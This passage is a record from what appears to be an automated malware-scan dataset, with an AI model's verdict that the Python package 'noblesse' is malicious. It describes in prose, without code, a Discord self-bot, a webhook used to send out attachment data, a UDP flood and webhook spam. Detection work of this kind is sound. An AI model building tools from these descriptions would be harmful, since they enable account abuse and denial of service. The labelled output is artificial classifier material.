These include:\n\n*   **Discord Self-Bot Capabilities**: Functions like `check_nitro`, `leave_guild`, `delete_guild`, `remove_friend`, `create_guild`, and `close` directly interact with the Discord API to perform actions such as attempting to redeem Nitro codes, leaving/deleting servers, removing friends, and creating new servers. These actions are characteristic of a Discord self-bot, which violates Discord's Terms of Service and can be used for account compromise, harassment, and destructive actions.\n*   **Data Exfiltration**: The `log_attachments` function is designed to send user attachment information to a specified webhook, indicating data exfiltration. Additionally, `DMChannel`, `GroupChannel`, and `GuildChannel` functions save Discord media (attachments) locally, structuring them into folders based on Discord channel and user names.\n*   **Denial-of-Service (DoS) Attack**: The `flood` function implements a UDP flood, a common method for performing denial-of-service attacks against a target IP and port.\n*   **Webhook Spamming**: The `webhook_spam` function allows for spamming content to any given webhook, which can be used for harassment or resource exhaustion.\n*   **Deceptive Description**: The package's stated purpose \""This Module Optimises your PC For Python\"" is completely misleading given the actual functionalities found within the `noblesse.py` script.\n\nThe combination of these features unequivocally points to a malicious intent, aiming to control Discord accounts, exfiltrate data, and perform network attacks.\n\nSuspicious file(s): `noblesse.py`"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""noblesse.py""], ""package_formatted_path"": "".temp/plain/noblesse-0.0.6_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""noblesse.py""]}","malicious","The `noblesse.py` file contains multiple highly suspicious and malicious functionalities that go far beyond ""optimizing your PC for Python"" as described in the package summary.
